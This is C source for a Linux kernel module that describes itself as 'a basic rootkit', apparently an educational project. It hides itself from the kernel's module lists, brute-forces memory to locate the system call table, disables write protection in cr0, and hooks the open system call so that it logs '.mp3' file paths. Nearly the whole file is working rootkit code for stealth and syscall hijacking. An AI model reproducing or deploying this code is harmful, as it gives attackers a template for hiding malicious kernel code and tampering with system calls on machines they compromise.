#include <linux/module.h> // Included for all kernel modules.
#include <linux/kernel.h> // Included for KERN_INFO.
#include <linux/init.h> // Included for __init and __exit macros.
#include <linux/slab.h> // For usage of kmalloc.
#include <asm/paravirt.h> // For usage of Read_cr0 and Write_cr0.
#include <linux/syscalls.h> 
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/string.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Richard Kavanagh <richard.kavanagh7@mail.dcu.ie>");
MODULE_DESCRIPTION("A basic rootkit.");


/* Old stystem call function prototype. */
asmlinkage int (*original_open)(const char *pathname, int flags);

/* New system call prototype. */
asmlinkage int hidden_open(const char *pathname, int flags);

unsigned long **sys_call_table;

/* Ensure file is only read once. */
int highjacked = 1;

static unsigned long **get_sys_call_table(void)
{
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;

    printk("Beginning brute force seach for Syscall table at location: %lx\n", offset);
    while (offset < ULLONG_MAX) 
    {
        sct = (unsigned long **)offset;
        /* Searching for bit pattern that matches sct[__NR_close]. */
        if (sct[__NR_close] == (unsigned long *) sys_close) 
        {
            printk(KERN_INFO "Syscall table found at location: %lx\n", offset);
            return sct;
        }
        offset += sizeof(void *);
    }
    return NULL;
}


char *fileType = ".mp3";

asmlinkage int hidden_open(const char *pathname, int flags) {

    if(strstr(pathname, fileType) != NULL && highjacked != 0) 
    {
        printk(KERN_INFO "%s\n", pathname);
        highjacked = 0;
    }
    return (*original_open)(pathname, flags);
}


static int __init hidden_init(void)
{

    printk(KERN_INFO "Starting up module.\n");

    /* Hide the module from proc/modules, Sys/modules tracking. */
    
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    
    /* Locate address of the Syscall table in memory. */
    if(!(sys_call_table = get_sys_call_table())) {
        printk(KERN_INFO "Unable to locate Syscall table.");
        return -1;
    }

    /* Disabling WP bit in control register cr0 to write to sys_call table. */
    write_cr0(read_cr0() & (~ 0x10000));
    
    /* Store open system call to use later. */
    original_open = (void *)sys_call_table[__NR_open];

    /* Write our modified read call to the syscall table. */
    sys_call_table[__NR_open] = (unsigned long *) hidden_open;  

    /* Turning WP bit back on. */
    write_cr0(read_cr0() | 0x10000); 

    return 0; 
}
 
static void __exit hidden_cleanup(void)
{
    /* Exit without cleaning up module. */
    if (!sys_call_table)
    {
        return;
    }

    printk(KERN_INFO "Cleaning up module.\n");

    /* Disabling WP bit in control register cr0 to revert changes. */
    write_cr0(read_cr0() & (~ 0x10000));

    /* Revert to original open system call. */
    sys_call_table[__NR_open] = (unsigned long *) original_open;  
    
    /* Revert cr0 to WP only. */
    write_cr0(read_cr0() | 0x10000); 
}
 
module_init(hidden_init);
module_exit(hidden_cleanup);